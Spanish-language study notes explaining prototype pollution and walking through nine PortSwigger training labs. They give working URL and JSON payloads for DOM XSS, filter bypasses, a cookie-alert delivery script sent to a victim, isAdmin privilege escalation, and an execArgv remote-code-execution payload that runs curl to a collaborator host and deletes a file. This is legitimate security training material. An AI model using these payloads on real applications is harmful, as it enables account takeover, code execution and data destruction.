-------
### QUE ES?
Una **Prototype Pollution** es una vulnerabilidad típica en **JavaScript** donde un atacante puede modificar el **prototype de un objeto global** (normalmente `Object.prototype`).  
Ocurre cuando la aplicación mezcla o copia objetos de forma insegura (por ejemplo usando `merge`, `extend`, `Object.assign`, etc.) sin filtrar propiedades especiales como `__proto__`, `constructor` o `prototype`.  
Esto permite **inyectar propiedades en todos los objetos de la aplicación**, lo que puede causar comportamientos inesperados como **bypass de autenticación, XSS, manipulación de lógica o incluso RCE** dependiendo del contexto.  
Si un atacante consigue **modificar o añadir propiedades a ese prototipo**, esas propiedades pasarán a existir **en todos los objetos de la aplicación**.
Una forma sencilla de verlo es como **envenenar el molde de las galletas**:  
si cambias el molde, **todas las galletas que se hagan después saldrán con esa modificación**.
Se previene **validando las claves del input del usuario y bloqueando propiedades peligrosas como `__proto__`, `constructor` y `prototype`**.
#### PASOS:
- *PROBAR SI PODEMOS MANIPULAR EL PROTOTIPE DESDE URL:* probar cosas como `/?__proto__[foo]=bar`, `/?__proto__.foo=bar`, `/?constructor.prototype.foo=bar`
- _IDENTIFICAR INPUTS QUE CREAN OBJETOS:_ parámetros **JSON**, query params o body donde se construyan objetos dinámicamente.
- _COMPROBAR SI SE HA CONTAMINADO:_ buscar cambios globales en la aplicación `console.log({}.foo)`.
- *BYPASS NO RECURSIVA:* tratar de bypasear con `/?__pro__proto__to__[foo]=bar`, `/?__pro__proto__to__.foo=bar`, `/?constconstructorructor.protoprototypetype.foo=bar
- _EXPLOTAR EL COMPORTAMIENTO:_ usar la propiedad contaminada para **bypass de lógica**, por ejemplo si la app comprueba:
    if(user.isAdmin)
    entonces el atacante puede convertir **todos los usuarios en admin**.
### LAB1: CLIENT-SIDE PROTOTYPE POLLUTION VIA BROWSER APIS
En este lab nos piden que encontremos alguna forma de añadir propiedad en el prototipo y identificar un gadget que nos permita ejecutar *javascript* para llevar a cabo un *XSS*
Un **gadget** es simplemente **código JS que usa una propiedad que tú puedes controlar**.
Una forma de probar el *prototype pollution* es a través de la url, si añadimos a la raíz `/?__proto__[foo]=bar` y en la consola con *ctrl + c* vemos que tenemos la propiedad *bar* creada tras hacer `console.log({}.foo)`. Si revisamos todo el flujo de request del laboratorio podemos ver una request a `/searchLoggerConfigurable.js` que  tiene un atributo *transport_url* y vemos que usa el método *Object.defineProperty()* para hacer *unwritable* y *unconfigurable* pero no define un valor de forma correcta ya que no le da ningún valor es decir cuando el código intenta usarlo, **lo busca en el prototype**. Si escribimos en la url `?__proto__[value]=foo` para envenenarlo y observamos en *network* con ctrl + c, podemos ver que carga el atributo foo. Basca con hacer `?__proto__[value]=data:,alert(0);
### LAB2: DOM XSS VIA CLIENT-SIDE PROTOTYPE POLLUTION
En este lab nos piden lo mismo que en el anterior. Probamos con `/?__proto__[foo]=bar` y a ver si se ha producido con `console.log({}.foo)` y vemos que funciona. Siguiendo el flujo del *Http History* vemos una request `/searchLogger.js` en la que usa propiedad *transport_url* que se usa pero no esta definida para el objeto *config* (GADGET). Bastará con envenenarlo a través de la url con `/?__proto__[transport_url]=data:,alert(1);`.
### LAB3: DOM XSS VIA AN ALTERNATIVE PROTOTYPE POLLUTION VECTOR
En este lab nos piden lo mismo que en el anterior. Probamos con `/?__proto__[foo]=bar` y a ver si se ha producido con `console.log({}.foo)` pero no vemos nada. Otra forma en la que lo podemos llevar a cabo es mediante `/?__proto__.foo=bar`, ahora al  mirar `console.log({}.foo)` si vemos que se ha creado. Siguiendo el flujo del *Http History* vemos una request a `/searchLoggerAlternative.js` en la que se usa un *eval* al que se le pasa *mnager.sequence* que no se define en ninguna parte. Si hacemos `/?__proto__.sequence=alert(1)`vemos que en la consola tenemos un error, podemos poner un *break point* y mirar el valor de *manager.sequence* vemos que es `alert(1)1`por lo que hemos metido bien el valor pero tenemos que quitar lo que ya añadia la funcion por defecto, `/?__proto__.sequence=alert(1)-`
### LAB4: CLIENT-SIDE PROTOTYPE POLLUTION VIA FLAWED SANITIZATION
En este lab nos piden lo mismo que en el anterior. Probamos con `/?__proto__[foo]=bar`, `/?__proto__[foo]=bar` y `/?constructor.prototype.foo=bar` pero nada. Si observamos un poco el *Http History* podemos ver una request `/deparamSanitized.js`que usa una función para sanitizar propiedades en `/searchLoggerFileterd.js`. Observándola vemos que se puede bypassear con `/?__pro__proto__to__[foo]=bar` comprobamos con `console.log({}.foo)` y lo tenemos. Identificamos una request `/searchLoggerFiltered.js` la cual usa *transport_url* sin estar definida. Bastaría con meter en la url `/?__pro__proto__to__[transport_url]=data:,alert(0);`
### LAB5: CLIENT-SIDE PROTOTYPE POLLUTION IN THIRD-PARTY LIBRARIES
En ese laboratorio nos dicen que usemos la extension de *Burpsuite* para encontrar las cosa de forma automática, para ello debemos usar el buscador de *Burpsuite*. Una vez allí activamos el *DOM invader* y la opción de *prototipe pollution*, ctrl + c y recargamos. Vemos que detecta dos *prototipe pollution* en la propiedad *hash*. Pinchamos en *scan for gadgets* veremos que nos detecta cosas, nos vamos a *DOM invader* y pinchamos en *exploit*, esto generará de forma automática una *POC* para llamar a `alert(0)`.
Creamos en el body del *exploit server* esto para enviárselo a la victima:
`<script>
`    location="https://LAB-ID.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
`</script>
### LAB6: PRIVILEGE ESCALATION VIA SERVER-SIDE PROTOTYPE SOLUTION
En este laboratorio nos piden que encontremos alguna forma de añadir propiedades al *Object.prototype* y un gadget que nos permita escalar *privilegios*. Si seguimos las request a través del *Http History* vemos una a `/my-account/change-address` que usa *JSON* para enviar los datos. Podemos probar a intentar añadir una nueva propiedad metiendo en el *JSON*:
`"__proto__": {
`    "foo":"bar"
`}
Vemos que el servidor nos responde añadiendo esta propiedad (*importante*: no devuelve el `__proto__` en la respuesta eso es que lo hemos envenenado). Podemos observar que la propiedad *isAdmin* esta en false, podemos tratar de modificar su valor para elevar nuestro privilegio mediante:
`"__proto__": {
`    "isdmin":"true"
`}
### LAB7: DETECTING SERVER-SIDE PROTOTYPE POLLUTION WITHOUT POLLUTED PROPERTY REFLECTION
En este lab nos piden lo mismo que en el anterior. Si analizamos las request en el *Http History* vemos que la de `/my-account/chang-address` usa *JSON* podemos probar a meter:
`"__proto__": {
`    "foo":"bar"
`}
Pero vemos que no modifica la respuesta. Cuando esto pasa podemos tratar de causar un error introduciendo una `,` o algun caracter especial. Vemos que en la respuesta hay una propiedar *status* que devuelve un *500*, si tratamos de modificarla con:
`"__proto__": {
`    "status":"555"
`}
### LAB8: BYPASSING FLAWED INPUT FILTERS FOR SERVER-SIDE PROTOTYPE POLLUTION
En este lab nos piden lo mismo que en el anterior. Si analizamos las request en el *Http History* vemos que la de `/my-account/chang-address` usa *JSON* podemos probar a meter:
`"__proto__": {
`    "json spaces":10
`}
Como vemos no parece que le afecte. Podemos probar a meter un construtor:
`"constructor": {
`    "prototype": {
`        "json spaces":10
`    }
`}
Si vemos en la respuesta en *raw* que las propiedades se muestran mas a la derecha es que podemos envenenarlo, como vemos hay un *isAdmin*:
`"constructor": {
`    "prototype": {
`        "isAdmin":"true"
`    }
`}
### LAB9: REMOTE CODE EXECUTION VIA SERVER-SIDE PROTOTYPE POLLUTION
En este lab nos piden lo mismo que en el anterior. Si analizamos las request en el *Http History* vemos que la de `/my-account/chang-address` usa *JSON* podemos probar a meter:
`"__proto__": {
`    "json spaces":10
`}
Como vemos parece que al verlo en *raw* las propiedades de la respuesta tienen mas indentacion. Ademas vemos que en el *Admin panel* hay un botón para correr tareas de mantenimiento.
Estas tareas lo que hacen son limpiar la base de datos y el sistema, estas son tareas típicas que crean procesos hijos. Podemos probar a ver si tenemos ejecucion de comandos enviando un curl a nuestro colaborator y *Poll now*:
`"__proto__": {
`    "execArgv":[
`        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
`    ]
`}
Vemos que al darle a ejecutar las tareas se hace la solicitud en el *colaborator* así que podemos probar a ver si se ejecuta como administrador por detrás:
`"__proto__": {
`    "execArgv":[
`        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
`    ]
`}
Y le damos a ejecutar las tareas